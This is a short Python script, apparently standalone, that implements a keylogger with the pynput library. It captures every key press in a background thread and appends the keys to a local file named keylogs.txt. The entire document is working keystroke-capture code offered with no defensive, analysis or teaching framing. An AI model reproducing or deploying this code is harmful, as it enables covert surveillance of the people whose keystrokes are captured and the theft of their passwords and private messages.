from pynput.keyboard import Key, Listener
import threading

# Function to log the keys
def log_key(key):
    try:
        with open("keylogs.txt", "a") as log_file:
            log_file.write(f'{key}\n')
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to start the keylogger
def start_keylogger():
    try:
        print("Starting keylogger...")
        with Listener(on_press=log_key) as listener:
            listener.join()  # This will keep the keylogger active until manually stopped
    except Exception as e:
        print(f"Error in keylogger: {e}")

# Run the keylogger in a separate thread
if __name__ == "__main__":
    try:
        keylogger_thread = threading.Thread(target=start_keylogger)
        keylogger_thread.start()
        print("Keylogger thread started.")
        keylogger_thread.join()  # This ensures the main thread waits for the keylogger to run
    except Exception as e:
        print(f"Error in main thread: {e}")
